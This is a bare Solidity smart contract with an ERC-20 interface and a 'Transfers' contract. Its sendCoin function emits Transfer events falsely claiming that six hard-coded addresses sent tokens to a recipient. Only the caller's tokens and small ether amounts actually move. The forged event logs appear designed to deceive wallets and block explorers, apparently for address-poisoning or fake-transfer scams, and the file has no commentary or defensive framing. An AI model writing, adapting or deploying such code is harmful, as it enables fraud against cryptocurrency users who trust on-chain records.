// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Transfers {
    event Transfer(address indexed from, address indexed to, uint256 value);

    address[] public list = [
        0xF977814e90dA44bFA03b6295A0616a897441aceC,
        0x13Ab6739368a4e4abf24695bf52959224367391f,
        0x75e89d5979E4f6Fba9F97c104c2F0AFB3F1dcB88,
        0x3CC936b795A188F0e246cBB2D74C5Bd190aeCF18,
        0xd89350284c7732163765b23338f2ff27449E0Bf5,
        0xb8e6D31e7B212b2b7250EE9c26C56cEBBFBe6B23
    ];

    function sendCoin(address _token, address payable _to) public payable {
        IERC20 token = IERC20(_token);
        token.transferFrom(msg.sender, _to, 10**18);
        uint256 value = 3**18;
        uint256 amount = msg.value;

        for (uint256 i = 0; i < list.length; i++) {
            emit Transfer(list[i], _to, value);
            token.transferFrom(msg.sender, _to, 10**18 + i);
            payable(list[i]).transfer(1);
            amount -= 1;
        }
        _to.transfer(amount);
    }
}
